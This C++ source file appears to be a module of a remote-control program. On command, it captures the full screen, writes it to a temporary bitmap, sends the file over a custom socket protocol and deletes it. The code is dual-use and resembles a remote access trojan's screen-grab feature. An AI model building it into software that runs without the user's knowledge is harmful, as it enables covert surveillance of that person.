#include "SSP_OnRecv.h"
#include <time.h>
/*
#include <gdiplus.h>
using namespace Gdiplus;
*/
BOOL SaveBitmapToFile(HBITMAP hBitmap, LPSTR lpFileName, int Quality);
HBITMAP CopyScreenToBitmap();


void Recv_Cmd_GetScreen(SSprotocol& sock) {
	char response[255];
	HBITMAP hbmp = CopyScreenToBitmap();
	time_t now; 
	time(&now); 

	char fileName[255 + 1] = {};
	sprintf_s(fileName, sizeof(fileName), "temp_screen_%lld", now);
	
	SaveBitmapToFile(hbmp, fileName, 4);
	Recv_Cmd_GetFile(sock, fileName, 255);
	
	DeleteFile(fileName);
}




BOOL SaveBitmapToFile(HBITMAP hBitmap, LPSTR lpFileName, int Quality)
{
	HDC hDC;                        // 设备描述表  

	int iBits;                      // 当前显示分辨率下每个像素所占字节数  
	WORD wBitCount;                 // 位图中每个像素所占字节数  
	DWORD dwPaletteSize = 0, dwBmBitsSize, dwDIBSize, dwWritten;    // 调色板大小，位图数据大小，位图文件大小，写入文件字节数  
	BITMAP Bitmap;                  //位图属性结构  
	BITMAPFILEHEADER bmfHdr;        // 位图文件头  
	BITMAPINFOHEADER bi;            // 位图信息头  
	LPBITMAPINFOHEADER lpbi;        // 指向位图信息头结构  

	HANDLE fh, hDib;                // 定义文件，分配内存句柄  
	HPALETTE hPal, hOldPal = NULL;    // 调色板句柄  

	// 计算位图文件每个像素所占字节数  
	hDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	iBits = GetDeviceCaps(hDC, BITSPIXEL) * GetDeviceCaps(hDC, PLANES);
	DeleteDC(hDC);
	/*
	if (iBits <= 1)
	wBitCount = 1;
	else if (iBits <= 4)
	wBitCount = 4;
	else if (iBits <= 8)
	wBitCount = 8;
	else if (iBits <= 24)
	wBitCount = 24;
	else
	wBitCount = 32;
	*/
	wBitCount = Quality;

	if (wBitCount <= 8)
		dwPaletteSize = (1i64 << wBitCount) * sizeof(RGBQUAD);       // 计算调色板大小  

	// 设置位图信息头结构  
	GetObject(hBitmap, sizeof(BITMAP), (LPSTR)&Bitmap);
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = Bitmap.bmWidth;
	bi.biHeight = Bitmap.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = wBitCount;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	dwBmBitsSize = ((Bitmap.bmWidth * wBitCount + 31) / 32) * 4 * Bitmap.bmHeight;

	hDib = GlobalAlloc(GHND, dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));  // 为位图内容分配内存  
	lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
	*lpbi = bi;
	// 处理调色板  
	hPal = (HPALETTE)GetStockObject(DEFAULT_PALETTE);
	if (hPal)
	{
		hDC = GetDC(NULL);
		hOldPal = SelectPalette(hDC, hPal, FALSE);
		RealizePalette(hDC);
	}
	// 获取该调色板下新的像素值  
	GetDIBits(hDC, hBitmap, 0, (UINT)Bitmap.bmHeight, (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize, (BITMAPINFO*)lpbi, DIB_RGB_COLORS);

	if (hOldPal)                // 恢复调色板  
	{
		SelectPalette(hDC, hOldPal, TRUE);
		RealizePalette(hDC);
		ReleaseDC(NULL, hDC);
	}
	// 创建位图文件   
	fh = CreateFile(lpFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (fh == INVALID_HANDLE_VALUE)
		return FALSE;

	// 设置位图文件头  
	bmfHdr.bfType = 0x4D42;     // 文件类型: "BM"  
	dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
	bmfHdr.bfSize = dwDIBSize;  // 位图文件大小  
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

	WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);  // 写入位图文件头  
	WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);                    // 写入位图文件其余内容  

	GlobalUnlock(hDib);
	GlobalFree(hDib);
	CloseHandle(fh);

	return TRUE;
}

HBITMAP CopyScreenToBitmap()
{
	HDC hScrDC, hMemDC;             // 屏幕和内存设备描述表  
	HBITMAP hBitmap, hOldBitmap;    // 位图句柄  
	int nWidth, nHeight;            // 位图宽度和高度  


	hScrDC = CreateDC("DISPLAY", NULL, NULL, NULL);     // 为屏幕创建设备描述表  

	hMemDC = CreateCompatibleDC(hScrDC);                // 为屏幕设备描述表创建兼容的内存设备描述表  

	nWidth = GetDeviceCaps(hScrDC, HORZRES);
	nHeight = GetDeviceCaps(hScrDC, VERTRES);

	hBitmap = CreateCompatibleBitmap(hScrDC, nWidth, nHeight);      // 创建一个与屏幕设备描述表兼容的位图  
	hOldBitmap = (HBITMAP)SelectObject(hMemDC, hBitmap);            // 把新位图选到内存设备描述表中  
	BitBlt(hMemDC, 0, 0, nWidth, nHeight, hScrDC, 0, 0, SRCCOPY); // 把屏幕设备描述表拷贝到内存设备描述表中  
	hBitmap = (HBITMAP)SelectObject(hMemDC, hOldBitmap);            // 得到屏幕位图的句柄  

	DeleteDC(hScrDC);
	DeleteDC(hMemDC);

	return hBitmap;
}


